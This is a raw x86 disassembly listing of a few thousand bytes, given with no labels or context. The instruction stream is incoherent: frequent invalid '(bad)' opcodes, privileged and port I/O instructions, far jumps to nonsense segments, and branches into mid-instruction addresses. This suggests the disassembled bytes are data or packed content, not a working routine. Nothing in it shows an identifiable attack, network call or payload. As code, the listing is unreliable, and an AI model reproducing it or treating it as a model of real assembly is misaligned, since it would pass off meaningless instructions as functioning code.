  4315e1:	push   ecx
  4315e2:	inc    DWORD PTR [ebx-0x76ffccbb]
  4315e8:	call   DWORD PTR [esi-0x1]
  4315eb:	dec    DWORD PTR [eax]
  4315ed:	mov    ecx,0x805ff
  4315f2:	inc    ebp
  4315f3:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  4315f9:	mov    ecx,0x35784
  4315fe:	add    BYTE PTR [ecx-0xffa59b],cl
  431604:	inc    ebp
  431605:	mov    ecx,0x9c6131
  43160a:	(bad)  
  43160b:	mov    eax,ebx
  43160d:	pop    esp
  43160e:	test   edi,edi
  431610:	clc    
  431611:	lea    eax,[ebp-0x24]
  431614:	cmp    eax,0xc7fe9c8d
  431619:	push   eax
  43161b:	lea    eax,[ebp+0x45fff8fe]
  431621:	mov    esi,DWORD PTR [ecx]
  431623:	hlt    
  431624:	lahf   
  431625:	push   esp
  431626:	mov    edx,DWORD PTR [ecx-0x4]
  431629:	xor    eax,DWORD PTR [eax+0x7201bb]
  43162f:	add    BYTE PTR [ebp-0x35],al
  431632:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  431638:	mov    edx,DWORD PTR [ecx-0x74]
  43163b:	rol    BYTE PTR [eax],0x8d
  43163e:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431642:	nop
  431643:	push   ecx
  431644:	add    bh,bh
  431646:	mov    esp,edi
  431648:	in     al,0x85
  43164a:	jge    0x43164a
  43164c:	test   edi,edi
  43164e:	jne    0x4315d5
  431650:	(bad)  
  431651:	(bad)  
  431652:	sbb    bh,bh
  431654:	push   ebp
  431655:	inc    ebp
  431656:	call   0xffdc10e6
  43165b:	add    BYTE PTR [ebp+0x66],al
  43165e:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431664:	cmp    al,0x85
  431666:	ud0    eax,DWORD PTR [ebp-0x1]
  43166a:	test   DWORD PTR [edi+0x74],ecx
  43166d:	dec    edi
  43166e:	inc    DWORD PTR [ebp-0x530004]
  431674:	dec    DWORD PTR [edi-0x75]
  431677:	dec    esi
  431678:	cld    
  431679:	test   DWORD PTR [eax+0xff01ff],eax
  43167f:	icebp  
  431680:	add    BYTE PTR [edi-0x3a],cl
  431683:	test   ebx,eax
  431685:	inc    BYTE PTR [ebp-0x1]
  431688:	jne    0x43168a
  43168a:	mov    eax,DWORD PTR [eax]
  43168c:	cld    
  43168d:	xor    BYTE PTR [ecx+0x500155],cl
  431693:	push   ebp
  431694:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43169a:	add    BYTE PTR [ebp+0x35e90f50],al
  4316a0:	add    al,BYTE PTR [eax]
  4316a2:	add    BYTE PTR [ebx-0x38fe4f80],al
  4316a8:	add    ah,ch
  4316aa:	or     BYTE PTR [ebp+0x4501f845],dh
  4316b0:	jmp    0xdf19a6
  4316b5:	(bad)  
  4316b6:	nop    ecx
  4316b9:	test   DWORD PTR [ebp+0x4502f8],eax
  4316bf:	xor    ecx,DWORD PTR [ebp-0x64]
  4316c2:	mov    eax,edi
  4316c4:	mov    ebx,DWORD PTR [eax+edx*2]
  4316c7:	add    eax,0x45fef885
  4316cc:	dec    DWORD PTR [ebx+0x339445]
  4316d2:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4316d8:	dec    DWORD PTR [ebx-0x460f0375]
  4316de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4316df:	add    esi,edi
  4316e1:	add    bh,bh
  4316e3:	rdpmc  
  4316e5:	add    BYTE PTR [ebx],0x1
  4316e8:	mov    DWORD PTR [eax],eax
  4316ea:	add    al,0x45
  4316ec:	dec    DWORD PTR [ecx-0x360b3373]
  4316f2:	dec    DWORD PTR [esi]
  4316f4:	push   eax
  4316f5:	jne    0x43173c
  4316f7:	mov    esi,DWORD PTR [ebx]
  4316f9:	cld    
  4316fa:	add    esp,ecx
  4316fc:	push   eax
  4316fd:	inc    DWORD PTR [ebp-0x75]
  431700:	add    eax,0x800e4
  431705:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43170b:	mov    DWORD PTR [ecx],eax
  43170d:	sbb    al,0x0
  43170f:	leave  
  431710:	test   DWORD PTR [edi-0x2],eax
  431713:	jne    0x431714
  431715:	call   0xff44011a
  43171a:	xor    BYTE PTR [ebp+0x4d],al
  43171d:	mov    edi,edi
  43171f:	enter  0x8,0x4d
  431723:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  431729:	mov    eax,DWORD PTR [eax]
  43172b:	cld    
  43172c:	add    DWORD PTR [ecx],ebx
  43172e:	inc    ebp
  43172f:	dec    ebp
  431730:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  431736:	inc    eax
  431737:	dec    DWORD PTR [ecx-0x270375]
  43173d:	add    BYTE PTR [ebx-0x39d72701],cl
  431743:	xchg   ecx,eax
  431744:	ret    
  431745:	add    BYTE PTR [ebp-0x830075],al
  43174b:	add    BYTE PTR [ebp-0x75],al
  43174e:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431754:	lea    edi,[edi-0xc]
  431757:	add    bh,bh
  431759:	mov    edx,DWORD PTR [eax-0x7b]
  43175c:	inc    ebp
  43175d:	rdpmc  
  43175f:	jne    0x431764
  431761:	add    BYTE PTR [eax-0x75],dl
  431764:	inc    ebp
  431765:	clc    
  431766:	add    eax,0x400009
  43176b:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431771:	mov    eax,DWORD PTR [ecx]
  431773:	in     al,dx
  431774:	add    dh,al
  431776:	test   ebx,eax
  431778:	inc    BYTE PTR [ebp-0xff0001]
  43177e:	add    BYTE PTR [ebp-0x43],al
  431781:	cmp    esi,0xfffffff8
  431784:	(bad)  
  431785:	push   DWORD PTR [eax]
  431787:	add    BYTE PTR [ebp-0x3a],dl
  43178a:	test   ebx,eax
  43178c:	je     0x431713
  43178e:	mov    edi,edi
  431790:	sbb    al,0xff
  431792:	test   DWORD PTR gs:[eax],eax
  431795:	(bad)  
  431796:	js     0x431797
  431798:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43179e:	sub    eax,ebx
  4317a0:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4317a6:	add    eax,DWORD PTR [eax]
  4317a8:	dec    ebp
  4317a9:	push   eax
  4317aa:	mov    al,BYTE PTR [ebp+0x1]
  4317ad:	mov    eax,DWORD PTR [ebp-0x68]
  4317b0:	mov    eax,DWORD PTR [eax]
  4317b2:	sbb    bh,al
  4317b4:	or     ah,dh
  4317b6:	dec    ebp
  4317b7:	inc    DWORD PTR [eax+0x4]
  4317ba:	push   ecx
  4317bb:	add    BYTE PTR [edx-0x1],dh
  4317be:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4317c4:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4317ce:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4317d4:	push   ecx
  4317d5:	cmp    BYTE PTR [ebx],al
  4317d7:	inc    ebp
  4317d8:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4317de:	(bad)  
  4317df:	(bad)  
  4317e0:	in     al,0xff
  4317e2:	add    BYTE PTR [ebp+0x0],al
  4317e5:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4317eb:	add    al,bh
  4317ed:	(bad)  
  4317ee:	jmp    0x8d85:0x74b0558d
  4317f5:	dec    DWORD PTR [eax]
  4317f7:	call   DWORD PTR [ebp-0x7b]
  4317fa:	mov    edi,esi
  4317fc:	lock call DWORD PTR [ebp-0x75]
  431800:	mov    esi,esp
  431802:	mov    ah,0xc6
  431804:	mov    bh,0xc3
  431806:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43180c:	add    DWORD PTR [eax],0x450050ff
  431812:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431818:	inc    edi
  43181a:	push   esp
  43181c:	jmp    0xcd00:0x650481ff
  431823:	mov    DWORD PTR [ebx],esi
  431825:	clc    
  431826:	cmp    edi,0xff9cff3c
  43182c:	jne    0x431836
  43182e:	mov    eax,eax
  431830:	add    esi,DWORD PTR [eax]
  431832:	int3   
  431833:	inc    ebp
  431834:	cmp    al,0x83
  431836:	add    BYTE PTR [eax],bl
  431838:	adc    DWORD PTR [ebx+0x768b5055],eax
  43183e:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431844:	mov    edi,eax
  431846:	cmp    BYTE PTR [ebp+0x45],cl
  431849:	jmp    0x4317d6
  43184b:	mov    ebx,DWORD PTR [esp+ebp*8]
  43184e:	inc    ebp
  43184f:	or     al,0x2
  431851:	dec    DWORD PTR [ebp+0x18]
  431854:	jne    0x4318ab
  431856:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  43185c:	mov    edi,DWORD PTR [ebx]
  43185e:	in     al,0x50
  431860:	xchg   ecx,eax
  431861:	jmp    0x3436766
  431866:	adc    al,0x8b
  431868:	inc    ebp
  431869:	mov    al,ds:0x8b04008b
  43186e:	push   ebp
  43186f:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431875:	push   ebp
  431876:	test   DWORD PTR [ebx-0x2800d701],ecx
  43187c:	inc    ebp
  43187d:	dec    ebp
  43187e:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431884:	mov    DWORD PTR [eax],0xe9ff00f4
  43188a:	add    al,0x0
  43188c:	add    BYTE PTR [eax],al
  43188e:	mov    eax,edx
  431890:	push   eax
  431891:	rol    DWORD PTR [ebp-0xf0177],1
  431897:	bound  eax,QWORD PTR [ebp+0x50]
  43189a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4318a0:	add    BYTE PTR [ecx+0x558df0ff],cl
  4318a6:	mov    al,0xf
  4318a8:	test   DWORD PTR [edx],edx
  4318aa:	call   DWORD PTR [ebp-0x7a0001]
  4318b0:	(bad)  
  4318b1:	loop   0x4318b2
  4318b3:	jnp    0xc6990cb9
  4318b9:	mov    eax,ebx
  4318bb:	cmp    al,0x8b
  4318bd:	(bad)  
  4318be:	cld    
  4318bf:	shr    esi,0xc
  4318c2:	add    dl,al
  4318c4:	push   eax
  4318c5:	lea    eax,[ebp-0x1]
  4318c8:	mov    edx,esi
  4318ca:	cwde   
  4318cb:	cli    
  4318cc:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4318d2:	or     BYTE PTR [eax],cl
  4318d4:	inc    ebp
  4318d5:	dec    ebp
  4318d6:	inc    DWORD PTR [ebx+0x74803914]
  4318dc:	add    DWORD PTR [ebx+0x451800],ecx
  4318e2:	call   DWORD PTR [eax+edx*1]
  4318e5:	add    ecx,DWORD PTR [ebp-0x34]
  4318e8:	push   edi
  4318e9:	adc    al,0x8
  4318eb:	mov    edx,DWORD PTR [ebp-0x14]
  4318ee:	mov    ecx,DWORD PTR [ebp+0x18]
  4318f1:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4318f5:	inc    DWORD PTR [eax+esi*8]
  4318f8:	inc    ebp
  4318f9:	stos   BYTE PTR es:[edi],al
  4318fa:	mov    edx,DWORD PTR [ebp-0x4]
  4318fd:	add    DWORD PTR [ebp-0x1c],eax
  431900:	mov    edx,DWORD PTR [ebp-0x70]
  431903:	cmp    eax,DWORD PTR [eax]
  431905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431906:	mov    eax,DWORD PTR [eax]
  431908:	cld    
  431909:	jae    0x43188b
  43190b:	add    eax,DWORD PTR [ecx]
  43190d:	clc    
  43190e:	add    BYTE PTR [eax+0x30],dl
  431911:	mov    DWORD PTR [ecx],esi
  431913:	clc    
  431914:	pop    ds
  431915:	inc    ebp
  431916:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43191c:	(bad)  
  43191d:	push   DWORD PTR [edi]
  43191f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431925:	(bad)  
  431926:	jae    0x431927
  431928:	mov    eax,DWORD PTR [ebp-0x740175]
  43192e:	sub    eax,DWORD PTR [eax]
  431930:	add    eax,DWORD PTR [eax]
  431932:	mov    DWORD PTR [ecx+0x5f],eax
  431935:	mov    DWORD PTR [ebx-0x4],ebx
  431938:	ret    0xff
  43193b:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431941:	ret    
  431942:	mov    eax,DWORD PTR [ebp-0x6f0075]
  431948:	add    BYTE PTR [ebp-0x7d],al
  43194b:	mov    DWORD PTR [eax],eax
  43194d:	add    al,0x84
  43194f:	inc    DWORD PTR [ecx]
  431951:	lea    eax,[eax]
  431953:	hlt    
  431954:	sar    bh,cl
  431956:	test   BYTE PTR [eax+0x1],dl
  431959:	inc    ebp
  43195a:	add    BYTE PTR [ebx],dh
  43195c:	test   BYTE PTR [ebx],0x84
  43195f:	push   eax
  431960:	add    BYTE PTR [ebp+0x0],al
  431963:	add    eax,0x86
  431968:	add    BYTE PTR [ebx-0x7f7b0340],cl
  43196e:	add    BYTE PTR [ecx],al
  431970:	add    BYTE PTR [eax],al
  431972:	mov    esi,0x550030
  431977:	mov    ecx,DWORD PTR [edi]
  431979:	cld    
  43197a:	fidiv  DWORD PTR [ebp+0x0]
  43197d:	mov    edi,DWORD PTR [ecx]
  43197f:	xor    BYTE PTR [eax+eax*1],0x84
  431983:	add    eax,DWORD PTR [eax]
  431985:	sbb    BYTE PTR [eax],al
  431987:	jne    0x43193a
  431989:	mov    eax,DWORD PTR [ecx]
  43198b:	sbb    BYTE PTR [eax],al
  43198d:	mov    DWORD PTR [ebp-0x1],esp
  431990:	add    BYTE PTR [eax+0x30e45ca],bh
  431996:	ret    0xb7fc
  431999:	dec    ebp
  43199a:	or     al,0x89
  43199c:	dec    ebp
  43199d:	cld    
  43199e:	cmovne ecx,DWORD PTR [eax-0x75]
  4319a2:	add    edi,esp
  4319a4:	seto   BYTE PTR [esi-0x72ffffff]
  4319ab:	inc    ebp
  4319ac:	adc    al,0x8b
  4319ae:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4319b5:	cmp    DWORD PTR [edi+0x72],edx
  4319b8:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4319be:	gs cmp al,0x0
  4319c1:	je     0x431999
  4319c3:	push   eax
  4319c4:	sar    BYTE PTR [eax],1
  4319c6:	mov    bh,0x3e
  4319c8:	push   cs
  4319c9:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4319cf:	add    DWORD PTR [ecx+0x12],ebp
  4319d2:	dec    edx
  4319d3:	(bad)  
  4319d4:	mov    eax,edx
  4319d6:	in     al,dx
  4319d7:	adc    DWORD PTR [ecx],esi
  4319d9:	pop    esi
  4319da:	inc    ecx
  4319db:	leave  
  4319dc:	or     DWORD PTR [eax],ebx
  4319de:	gs push ebp
  4319e0:	add    ah,ch
  4319e2:	into   
  4319e3:	in     al,dx
  4319e4:	enter  0xb756,0xf0
  4319e8:	push   cs
  4319e9:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4319f3:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4319f9:	jnp    0x74439f01
  4319ff:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a05:	add    BYTE PTR [edi],cl
  431a07:	mov    edi,DWORD PTR [ecx-0x78]
  431a0a:	ltr    WORD PTR [ecx-0x7b]
  431a0e:	dec    DWORD PTR [edi]
  431a10:	clc    
  431a11:	out    0x45,eax
  431a13:	add    BYTE PTR [eax],cl
  431a15:	cmp    ebx,0xffffff8c
  431a18:	jge    0x431a1a
  431a1a:	jb     0x431a2c
  431a1c:	je     0x521a9c
  431a22:	pop    edx
  431a23:	push   esi
  431a24:	mov    ecx,DWORD PTR [edi]
  431a26:	in     al,dx
  431a27:	rol    DWORD PTR [ebp+0x0],1
  431a2a:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431a31:	cmp    DWORD PTR [ecx],0xfffffff0
  431a34:	hlt    
  431a35:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431a3b:	(bad)  
  431a3d:	push   eax
  431a3e:	jns    0xb842febc
  431a44:	lock push cs
  431a46:	ror    edx,0x3
  431a49:	test   BYTE PTR [ecx+0x5500e800],cl
  431a4f:	dec    eax
  431a50:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431a54:	(bad)  
  431a55:	mov    esi,0x7f33ff5f
  431a5a:	inc    eax
  431a5b:	test   DWORD PTR [edx],eax
  431a5d:	je     0x431a1f
  431a5f:	mov    ecx,ecx
  431a61:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431a65:	and    eax,DWORD PTR [eax+0xf0103]
  431a6b:	jp     0x431a59
  431a6d:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431a71:	add    edx,DWORD PTR [edi+0x74]
  431a74:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431a7a:	add    BYTE PTR [ebp-0x74c48bbb],al
  431a80:	je     0x431a05
  431a82:	cmp    eax,edi
  431a84:	js     0x431aa9
  431a86:	add    eax,0xeb0fc003
  431a8b:	jns    0x431a18
  431a8d:	vmread DWORD PTR [ecx+0x45],ebx
  431a91:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431a97:	adc    al,0x8b
  431a99:	jge    0x431aaf
  431a9b:	mov    edi,DWORD PTR [eax-0x4]
  431a9e:	add    edi,DWORD PTR [edi]
  431aa0:	or     bh,bh
  431aa2:	push   ebp
  431aa3:	push   es
  431aa4:	mov    DWORD PTR [ebp-0x4],ebx
  431aa7:	add    edi,esi
  431aa9:	pop    es
  431aaa:	add    esi,DWORD PTR [edi-0x48ccf183]
  431ab0:	mov    DWORD PTR [esp+esi*8],ecx
  431ab3:	inc    ebp
  431ab4:	pop    ebp
  431ab5:	xor    DWORD PTR [esi-0x4],0x3b
  431ab9:	add    edx,DWORD PTR [ecx+edi*1]
  431abc:	push   es
  431abd:	clc    
  431abe:	mov    bh,0xdb
  431ac0:	jp     0x431a79
  431ac2:	add    cl,BYTE PTR [esi]
  431ac4:	div    DWORD PTR [edi+0x4d8b0c1c]
  431aca:	test   edi,edi
  431acc:	je     0x431ac2
  431ace:	mov    eax,ecx
  431ad0:	or     BYTE PTR [ebx],al
  431ad2:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431ad8:	jbe    0x431b4c
  431ada:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431ae0:	add    ecx,DWORD PTR [esi]
  431ae2:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431ae8:	add    eax,DWORD PTR [ebx-0x287af783]
  431aee:	je     0x431b3d
  431af0:	mov    DWORD PTR [ecx],edi
  431af2:	mov    esi,eax
  431af4:	hlt    
  431af5:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431afc:	jb     0x431abe
  431afe:	jmp    0x431aeb
  431b00:	xor    esi,DWORD PTR [ebx]
  431b02:	pop    edi
  431b03:	pop    esi
  431b04:	pop    ebx
  431b05:	ret    
  431b06:	ret    0x8b
  431b09:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431b0f:	xor    DWORD PTR [ecx],0xc
  431b12:	pushf  
  431b13:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431b19:	rdmsr  
  431b1b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431b22:	dec    ebp
  431b23:	ret    
  431b24:	mov    edi,DWORD PTR [esi-0x4]
  431b27:	pop    eax
  431b28:	dec    ebp
  431b29:	jne    0x431ab6
  431b2b:	xor    edi,esp
  431b2d:	inc    eax
  431b2e:	dec    ebp
  431b2f:	jbe    0x431b84
  431b31:	inc    eax
  431b32:	pop    ebp
  431b33:	add    edx,DWORD PTR [esi+0x8]
  431b36:	push   esp
  431b37:	dec    eax
  431b38:	push   ecx
  431b39:	mov    eax,edi
  431b3b:	and    al,0xf0
  431b3d:	jo     0x431b2a
  431b3f:	mov    eax,DWORD PTR [ebx]
  431b41:	sbb    BYTE PTR [ebp+0x4d],cl
  431b44:	mov    eax,DWORD PTR [ebx]
  431b46:	nop
  431b47:	or     BYTE PTR [eax],al
  431b49:	jne    0x431ba2
  431b4b:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431b51:	cld    
  431b52:	xor    edi,edi
  431b54:	add    edi,DWORD PTR [ebp+0x3]
  431b57:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431b5d:	js     0x431ae3
  431b5f:	jae    0x431b63
  431b61:	(bad)  
  431b63:	xor    al,0x5d
  431b65:	jmp    0x431af2
  431b67:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431b6e:	fdecstp 
  431b70:	test   BYTE PTR [edi],ah
  431b72:	add    bh,BYTE PTR [ebp+0x0]
  431b75:	add    ebx,DWORD PTR [ebp-0x77]
  431b78:	mov    edi,eax
  431b7a:	cmp    al,0x0
  431b7d:	adc    dh,BYTE PTR [ebx]
  431b7f:	jge    0x431b84
  431b81:	mov    edi,DWORD PTR [ebx]
  431b83:	jl     0x431b94
  431b85:	clc    
  431b86:	dec    edi
  431b87:	jge    0x431b89
  431b89:	mov    eax,DWORD PTR [ebx]
  431b8b:	jb     0x431b95
  431b8d:	mov    ecx,DWORD PTR [ebp-0x8]
  431b90:	mov    edi,edi
  431b92:	xor    edx,DWORD PTR [eax]
  431b94:	add    edi,DWORD PTR [ebx]
  431b96:	mov    DWORD PTR [ebp-0x10],edi
  431b99:	inc    edi
  431b9a:	pop    ebp
  431b9b:	jge    0x431bd8
  431b9d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431ba1:	mov    edx,0xc05d87f0
  431ba6:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431baa:	fimul  WORD PTR [eax]
  431bac:	fist   WORD PTR [ebp+0x1c]
  431baf:	in     al,dx
  431bb0:	jne    0x431b9e
  431bb2:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431bb8:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431bbc:	fdivp  st(0),st
  431bbe:	fild   WORD PTR [ebp+0x4510f85c]
  431bc4:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431bca:	inc    ebp
  431bcb:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431bd1:	mov    ebp,DWORD PTR [ebx-0x4]
  431bd4:	adc    al,0x8b
  431bd6:	rcl    DWORD PTR [eax],0x48
  431bd9:	mov    esi,0x7080803
  431bde:	fiadd  WORD PTR [ebp+0x4d]
  431be1:	(bad)  
  431be2:	mov    edx,DWORD PTR [edx-0x4]
  431be5:	mov    edx,DWORD PTR [ebp-0x4]
  431be8:	xor    ebx,DWORD PTR [ebx+0x330103]
  431bee:	mov    DWORD PTR [edi+0x872dc],edi
  431bf4:	xlat   BYTE PTR ds:[ebx]
  431bf5:	into   
  431bf6:	ffreep st(6)
  431bf8:	retf   0x6c7
  431bfb:	iret   
  431bfc:	dec    ebp
  431bfd:	inc    ebp
  431bfe:	mov    DWORD PTR [ebx],edi
  431c00:	fmul   QWORD PTR [edi]
  431c02:	dec    ebp
  431c03:	jnp    0x431c38
  431c05:	add    BYTE PTR [ebx],al
  431c07:	mov    ecx,DWORD PTR [esp+edi*8]
  431c0a:	inc    ebp
  431c0b:	dec    ebp
  431c0c:	lea    esi,[ebx]
  431c0e:	add    DWORD PTR [ebx],eax
  431c10:	jb     0x431c4d
  431c12:	add    BYTE PTR [edi],cl
  431c14:	inc    ebp
  431c15:	imul   eax,edi,0x858bd800
  431c1b:	cld    
  431c1c:	clc    
  431c1d:	mov    DWORD PTR [ebp+0x0],eax
  431c20:	inc    DWORD PTR [eax]
  431c22:	or     al,0xde
  431c24:	sbb    bh,0x1
  431c27:	retf   
  431c28:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431c2f:	dec    ebp
  431c30:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431c36:	enter  0x12de,0xdf
  431c3a:	inc    ebp
  431c3b:	pop    ebp
  431c3c:	dec    DWORD PTR [ebx-0x257f0ff4]
  431c42:	add    DWORD PTR [edx],edx
  431c44:	add    BYTE PTR [ebp+0x50],dl
  431c47:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431c4d:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431c53:	or     ah,al
  431c55:	pop    ss
  431c56:	cdq    
  431c57:	push   ebp
  431c58:	clc    
  431c59:	mov    eax,DWORD PTR [ebp-0x4]
  431c5c:	xor    edx,edx
  431c5e:	add    esi,DWORD PTR [ebx]
  431c60:	cmp    eax,DWORD PTR [ebx]
  431c62:	hlt    
  431c63:	cmp    DWORD PTR [ebx],esp
  431c65:	or     al,BYTE PTR [ebp+0xf]
  431c68:	mov    eax,DWORD PTR [edx]
  431c6a:	loopne 0x431c6c
  431c6c:	(bad)  
  431c6d:	mov    ecx,esi
  431c6f:	cld    
  431c70:	pushf  
  431c71:	pop    ebp
  431c72:	fwait
  431c73:	mov    esi,DWORD PTR [edx]
  431c75:	lock mov eax,eax
  431c78:	adc    BYTE PTR [ebx],al
  431c7a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431c81:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431c87:	dec    ebp
  431c88:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431c8e:	(bad)  
  431c8f:	iret   
  431c90:	inc    ebp
  431c91:	(bad)  
  431c92:	jne    0x431ce1
  431c94:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431c9a:	(bad)  
  431c9b:	cmp    ebx,eax
  431c9d:	je     0x431c25
  431c9f:	add    edi,edi
  431ca1:	or     bh,bh
  431ca3:	dec    ebp
  431ca4:	inc    ebp
  431ca5:	mov    esi,DWORD PTR [ebx]
  431ca7:	cld    
  431ca8:	add    ecx,esi
  431caa:	cmp    ecx,DWORD PTR [eax-0xc]
  431cad:	mov    edx,DWORD PTR [edi]
  431caf:	or     BYTE PTR [ebp-0x7c],al
  431cb2:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431cb8:	test   BYTE PTR [ebx+ebx*4],cl
  431cbb:	inc    ebp
  431cbc:	xor    bh,BYTE PTR [esi]
  431cbe:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431cc5:	jne    0x431c8e
  431cc7:	mov    ebp,esp
  431cc9:	fcomp  DWORD PTR [ebx]
  431ccb:	add    BYTE PTR [ecx],al
  431ccd:	inc    DWORD PTR [ebp-0x75]
  431cd0:	(bad)  
  431cd1:	cld    
  431cd2:	add    al,0xce
  431cd4:	mov    ecx,edi
  431cd6:	cld    
  431cd7:	inc    ebp
  431cd8:	fidivr WORD PTR [ebx]
  431cda:	fbstp  TBYTE PTR [ebp-0x3e]
  431cdd:	mov    eax,DWORD PTR [eax]
  431cdf:	adc    BYTE PTR [ebx-0x3974038b],cl
  431ce5:	fadd   st,st(7)
  431ce7:	add    BYTE PTR [ebp-0x1],al
  431cea:	mov    ecx,DWORD PTR [esp+edi*8]
  431ced:	inc    ebp
  431cee:	mov    bh,0xc7
  431cf1:	loopne 0x431d38
  431cf3:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431cf9:	sbb    dh,BYTE PTR [ebx]
  431cfb:	pushf  
  431cfc:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d02:	mov    eax,edi
  431d04:	cwde   
  431d05:	inc    ebp
  431d06:	inc    ebp
  431d07:	jne    0x431c94
  431d09:	mov    esp,esp
  431d0b:	clc    
  431d0c:	add    al,0x4d
  431d0e:	mov    DWORD PTR [ebx],esi
  431d10:	or     al,0x33
  431d12:	inc    ebp
  431d13:	lea    ecx,[ebx-0x398d13fd]
  431d19:	add    bh,al
  431d1b:	inc    ebp
  431d1c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431d23:	add    ebp,esp
  431d25:	shufps xmm1,xmm3,0xc7
  431d29:	(bad)  
  431d2a:	jmp    0x74885853
  431d2f:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431d35:	hlt    
  431d36:	mov    ecx,DWORD PTR [edi]
  431d38:	fadd   DWORD PTR [ebp+0x0]
  431d3b:	xor    ecx,DWORD PTR [edi]
  431d3d:	add    ecx,ecx
  431d3f:	cmp    edi,edi
  431d41:	pmuludq mm7,QWORD PTR [edx+0x50]
  431d45:	(bad)  
  431d46:	jmp    0x431cd3
  431d48:	mov    edi,esp
  431d4a:	or     al,0xc6
  431d4c:	inc    ebp
  431d4d:	(bad)  
  431d4e:	mov    eax,DWORD PTR [ebp+0x10]
  431d51:	jne    0x431cdc
  431d53:	mov    eax,DWORD PTR [ecx]
  431d55:	clc    
  431d56:	add    BYTE PTR [ebp-0x40],cl
  431d59:	xor    edx,DWORD PTR [eax-0x73]
  431d5c:	jne    0x431d5f
  431d5e:	push   DWORD PTR [edx+0x8]
  431d61:	add    BYTE PTR [ebp+0x45],al
  431d64:	mov    ebp,ecx
  431d66:	cld    
  431d67:	add    BYTE PTR [ebp+0x0],cl
  431d6a:	xor    eax,DWORD PTR [ebp+0x3]
  431d6d:	mov    DWORD PTR [ebx],edi
  431d6f:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431d75:	sub    eax,0x5d330e4d
  431d7a:	lea    esi,[ebx]
  431d7c:	add    DWORD PTR [ebx],eax
  431d7e:	jb     0x431d69
  431d80:	add    BYTE PTR [eax],al
  431d82:	inc    ebp
  431d83:	add    bl,ch
  431d85:	inc    ebp
  431d86:	mov    esi,DWORD PTR [ebx]
  431d88:	or     al,0x3
  431d8a:	(bad)  
  431d8b:	mov    edi,eax
  431d8d:	in     al,dx
  431d8e:	scas   eax,DWORD PTR es:[edi]
  431d8f:	inc    ebp
  431d90:	mov    esi,DWORD PTR [ebx]
  431d92:	in     al,0x3
  431d94:	add    al,0x89
  431d96:	mov    ecx,DWORD PTR [eax+edi*8]
  431d99:	dec    ebp
  431d9a:	(bad)  
  431d9b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431da2:	mov    ecx,eax
